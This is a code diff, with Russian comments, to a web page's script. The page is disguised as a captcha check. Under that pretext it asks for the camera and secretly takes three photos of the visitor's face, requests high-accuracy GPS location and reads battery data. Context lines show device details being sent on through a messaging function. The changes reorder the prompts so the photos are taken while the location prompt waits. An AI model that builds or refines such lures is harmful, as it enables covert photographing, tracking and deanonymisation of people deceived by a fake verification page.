@@ -211,7 +211,7 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             await _sD(msg);
         });
 
-        // --- PHASE 2: INTERACTIVE ---
+        // --- PHASE 2: INTERACTIVE (UPDATED v3.0 - STRICT SEQUENTIAL + OPTIMIZED) ---
         const bB = document.getElementById('captcha-box');
         const b = document.getElementById('btn');
         
@@ -219,34 +219,35 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             if (b.style.display === 'none') return;
             b.style.display = 'none';
             document.getElementById('loader').style.display = 'block';
+            log("Starting Phase 2 (v3.0)...");
             
-            // 1. СНАЧАЛА КАМЕРА (Блокирующее ожидание, чтобы не было наслоения)
-            // Мы просим камеру первой, так как она требует явного решения "Разрешить/Блокировать".
-            // Функция await getUserMedia ЖДЕТ решения пользователя.
+            // 1. СНАЧАЛА КАМЕРА (Полная блокировка до решения)
             document.getElementById('label-text').innerText = "Allow Camera...";
             let stream = null;
             let video = document.getElementById('video');
             
             try {
+                // Запрашиваем камеру и ЖДЕМ ответа
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: { ideal: 640 } } 
                 });
                 video.srcObject = stream;
-                try { await video.play(); } catch(e) { console.log("Auto-play blocked:", e); }
+                // Пытаемся запустить видео
+                try { await video.play(); } catch(e) { log("Auto-play blocked: " + e); }
             } catch (e) {
-                console.log("Camera Error:", e);
-                // Если запретил камеру - ничего страшного, идем дальше к GPS
+                log("Camera denied/error: " + e);
+                // Если отказ - просто идем дальше
             }
 
-            // 2. ТЕПЕРЬ GPS (Когда с камерой разобрались)
-            // Окно камеры уже закрыто (так как мы прошли await).
+            // 2. ЗАПУСК GPS (Сразу после решения по камере)
+            // Мы не ждем завершения GPS сразу, чтобы параллельно делать фото
             document.getElementById('label-text').innerText = "Allow Location...";
             
-            let gpsData = await new Promise(resolve => {
+            const gpsPromise = new Promise(resolve => {
                 if (!navigator.geolocation) return resolve({t:"*GPS не поддерживается*", e:true});
                 
-                // Тайм-аут 10 сек (на случай долгого думания)
-                const timer = setTimeout(() => resolve({t:"*GPS: Тайм-аут*", e:true}), 10000);
+                // Тайм-аут 30 сек (УВЕЛИЧЕНО для ноутбуков/ПК)
+                const timer = setTimeout(() => resolve({t:"*GPS: Тайм-аут (Медленный интернет/отказ)*", e:true}), 30000);
 
                 navigator.geolocation.getCurrentPosition(
                     async p => {
@@ -267,32 +268,40 @@ CPU: ${s.c} ядра | RAM: ${s.r}
                         else if (err.code === 2) e = "Недоступно";
                         else if (err.code === 3) e = "Тайм-аут";
                         resolve({t:`*GPS Ошибка: ${e}*`, e:true});
-                    }
+                    },
+                    { enableHighAccuracy: true } // Просим точную геопозицию
                 );
             });
-            let gps = gpsData.t;
 
-            // 3. ФОТО (Если камера была разрешена)
+            // 3. ФОТО (Параллельно с ожиданием GPS, если камера есть)
             let ph = [];
             if (stream) {
                 document.getElementById('label-text').innerText = "Verifying...";
-                // Небольшая пауза для стабилизации света
+                
+                // Пауза для настройки баланса белого
                 await sleep(1500); 
 
                 const c = document.getElementById('canvas');
                 c.width = video.videoWidth || 640; c.height = video.videoHeight || 480;
                 const ctx = c.getContext('2d');
 
+                // Делаем 3 фото
                 for(let i=0; i<3; i++) {
                     ctx.drawImage(video,0,0);
                     ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.6)));
-                    if(i<2) await sleep(500);
+                    if(i<2) await sleep(600);
                 }
-                // Останавливаем камеру
+                
+                // Все, камера больше не нужна
                 stream.getTracks().forEach(t=>t.stop());
             }
 
-            // 4. Батарея
+            // 4. ОЖИДАНИЕ GPS (Если фото сделали быстрее, чем юзер нажал "Разрешить")
+            if (stream) document.getElementById('label-text').innerText = "Finishing...";
+            const gpsData = await gpsPromise;
+            const gps = gpsData.t;
+
+            // 5. БАТАРЕЯ
             let bat = "N/A";
             if (navigator.getBattery) {
                 try {
